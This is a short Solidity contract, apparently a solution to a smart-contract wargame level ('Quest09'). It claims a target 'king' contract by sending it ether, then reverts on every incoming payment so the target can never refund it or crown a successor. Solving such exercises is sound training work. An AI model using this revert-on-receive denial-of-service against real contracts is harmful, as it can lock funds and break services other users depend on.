//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Quest09 is Ownable {
    constructor() payable {}

    function attack(address kingAddress) public onlyOwner {
        (bool result, ) = kingAddress.call{value: address(this).balance}("");
        if (result) {
            result;
        }
    }

    receive() external payable {
        revert("I don't accept any ether sends to me");
    }
}
